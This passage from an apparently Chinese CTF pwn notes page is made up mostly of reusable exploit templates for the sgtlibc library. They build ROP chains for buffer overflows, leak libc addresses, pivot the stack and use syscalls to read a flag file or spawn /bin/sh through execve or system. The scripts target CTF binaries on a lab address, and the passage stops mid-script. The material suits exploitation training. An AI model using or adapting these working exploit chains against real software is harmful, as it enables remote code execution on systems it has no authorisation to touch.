    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>

libc_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
<span class="token comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --multibr | grep 'syscall ; ret'</span>
syscall_addr <span class="token operator">=</span> <span class="token number">0x000058dba</span>

flag_path <span class="token operator">=</span> <span class="token string">'./flag\x00\x00'</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x601800</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
file_description <span class="token operator">=</span> <span class="token number">3</span>  <span class="token comment"># 需要根据当前fd值修改</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span>
               elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>main_addr<span class="token punctuation">]</span>
    sa<span class="token punctuation">(</span>b<span class="token string">'welcome\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token comment"># ru('input:\n')</span>
    <span class="token comment"># ru(fakeebp())  # 如果有输出则清空缓存</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
addr <span class="token operator">=</span> leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets<span class="token punctuation">.</span>ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>get_rop<span class="token punctuation">(</span>show_banner<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_libc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
offset <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">exp_control_rdirsirdx</span><span class="token punctuation">(</span>rdi<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> rsi<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> rdx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> r15<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi<span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rsi_r15'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> r15<span class="token punctuation">]</span>  <span class="token comment"># csu必然有</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdx'</span><span class="token punctuation">]</span> <span class="token operator">+</span> offset<span class="token punctuation">,</span> rdx<span class="token punctuation">]</span>
    <span class="token keyword">return</span> payload


payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 写入flag字符串到bss</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token comment"># 64位syscall 0:read 1:write 2:open</span>
<span class="token comment"># 32位int 3:read 4:write 5:open</span>

<span class="token comment"># 打开flag文件</span>
open_syscall <span class="token operator">=</span> <span class="token number">2</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rax'</span><span class="token punctuation">]</span><span class="token operator">+</span>offset<span class="token punctuation">,</span> open_syscall<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span>bss_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>syscall_addr<span class="token operator">+</span>offset<span class="token punctuation">]</span>

<span class="token comment"># 读取flag内容</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span>file_description<span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>


<span class="token comment"># 打印flag</span>
write_syscall <span class="token operator">=</span> <span class="token number">1</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rax'</span><span class="token punctuation">]</span><span class="token operator">+</span>offset<span class="token punctuation">,</span> write_syscall<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>syscall_addr<span class="token operator">+</span>offset<span class="token punctuation">]</span>

se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
se<span class="token punctuation">(</span>flag_path<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="rop_int80_x86x64_787"></a>rop int80 -x86/x64</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
<span class="token keyword">import</span> os


set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./simplerop'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
read_addr <span class="token operator">=</span> <span class="token number">0x0806CD50</span>
binsh_addr <span class="token operator">=</span> <span class="token number">0x080EB564</span>

canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 如果是64位</span>
<span class="token comment"># 寄存器：rax rbx rcx rdx </span>
<span class="token comment"># 系统调用  int80(3) === write</span>
<span class="token comment">#          int80(11) === execve</span>
<span class="token comment"># 如果是32位</span>
<span class="token comment"># eax ebx ecx edx</span>
<span class="token comment"># 系统调用 syscall(0) === write</span>
<span class="token comment">#          syscall(59) === execve</span>

payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># read(0,binsh,8)</span>
<span class="token comment"># payload += [read_addr] # 题目有read则直接用</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'eax'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>  <span class="token comment"># 没有的话则用int80(3)===read调用</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'edx_ecx_ebx'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'int_80'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>


<span class="token comment"># int11 -&gt; execve(binsh,0,0)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'eax'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> constants<span class="token punctuation">.</span>SYS_execve<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'edx_ecx_ebx'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'int_80'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>


sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>

interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="rop_bss_move_pointer_HARD_855"></a>rop bss_move_pointer HARD</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ciscn_s_8'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf


<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> b<span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x66</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token comment"># 基于move [rxx], rxx 实现直接传入/bin/sh</span>

bss <span class="token operator">=</span> <span class="token number">0x06BD000</span>  <span class="token comment"># 取一个没有被使用的区域</span>
mov_rax_inrsi <span class="token operator">=</span> <span class="token number">0x47f7b1</span> <span class="token comment"># 注意需要找一个后续会控制的寄存器</span>

payload <span class="token operator">=</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rsi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'//bin/sh'</span>  <span class="token comment"># padding to 8 bytes</span>
payload <span class="token operator">+=</span> p00<span class="token punctuation">(</span>mov_rax_inrsi<span class="token punctuation">)</span>  <span class="token comment"># 找一个 mov [rsi], rax</span>
payload <span class="token operator">+=</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token comment"># /bin/sh to bss </span>
payload <span class="token operator">+=</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdx_rsi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>
payload <span class="token operator">+=</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span><span class="token number">0x3B</span><span class="token punctuation">)</span> <span class="token operator">+</span> p00<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'syscall_rdx_rsi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Please enter your Password: \n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x50</span> <span class="token operator">+</span> encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="stack_migration_to_memoryx64_901"></a>stack migration to memory-x64</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>shell
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./test'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
align_len <span class="token operator">=</span> <span class="token number">0x100</span>  <span class="token comment"># 用于迁移后的rop</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x00601800</span> <span class="token operator">-</span> align_len <span class="token operator">-</span> <span class="token number">8</span>  <span class="token comment"># 直接用固定值0x601800，页对齐有0x1000可用</span>
main_addr <span class="token operator">=</span> <span class="token number">0x04006D2</span>  <span class="token comment"># elf.symbols['main']</span>


<span class="token keyword">def</span> <span class="token function">migration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'how long is your name: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 该题是要求输入可用大小</span>
    sa<span class="token punctuation">(</span><span class="token string">'and what\'s you name? '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">128</span><span class="token punctuation">,</span>
       bss_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'leave'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 使用leave完成栈迁移</span>
    sla<span class="token punctuation">(</span><span class="token string">'how long is your name: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 该题是要求输入可用大小</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> align_len<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    migration<span class="token punctuation">(</span><span class="token punctuation">)</span>

    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 寻找一个直接ret的函数</span>
    <span class="token comment"># payload += [[0] * 0x15] # 地址过低导致旁边有got表，通过此升栈以避开</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">]</span>
    <span class="token comment"># sla(b' input\n',payload)</span>

    sa<span class="token punctuation">(</span>b<span class="token string">'and what\'s you name? '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token comment"># sl(payload)</span>
    <span class="token comment"># ru(fakeebp())  # 如果有输出则清空缓存</span>

    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'data:{data}'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> uc<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># leak('printf')</span>
leak<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('stdout')</span>
<span class="token comment"># leak('stdin')</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>

<span class="token comment"># libc = ELF('libc_buu-2.23_x64.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span>  <span class="token comment"># sometime maybe wrong</span>
payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># + p00(ret_addr)  # 栈平衡</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">,</span> system_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
migration<span class="token punctuation">(</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="stackmigration_to_stackx86_985"></a>stack-migration to stack-x86</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
<span class="token keyword">import</span> os

set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ciscn_s_4'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 栈迁移：泄露ebp或某个既定地址</span>
buf_size <span class="token operator">=</span> <span class="token number">40</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>buf_size<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 方便查看结尾</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># read话用se ， scanf 用sl</span>
ru<span class="token punctuation">(</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ebp <span class="token operator">=</span> u00<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
